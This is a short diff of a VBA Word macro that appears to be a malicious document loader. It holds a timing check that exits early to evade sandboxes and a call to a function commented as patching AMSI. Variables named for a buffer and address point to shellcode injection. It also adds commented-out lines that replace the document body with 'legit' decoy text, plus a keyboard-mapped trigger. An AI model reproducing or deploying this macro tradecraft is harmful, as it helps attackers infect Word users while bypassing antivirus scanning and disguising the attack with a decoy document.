@@ -23,8 +23,12 @@ Function MyMacro()
  If subtime < 3.5 Then
     Exit Function
  End If
+ 'This portion to delete document body and replace with auto text (the "legit" content)
+ 'ActiveDocument.Content.Select
+ 'Selection.Delete
+ 'ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
+ 'patch function patches AMSI
  patch
- MsgBox "The version of Word is " & Application.Version
  Dim buf As Variant
  Dim addr As LongPtr
  Dim counter As LongPtr
@@ -77,5 +81,6 @@ Sub test()
  MyMacro
 End Sub
 Sub king()
+    'king function calls the keyboard mapped macro to call test main function
     Application.Run MacroName:="test"
 End Sub
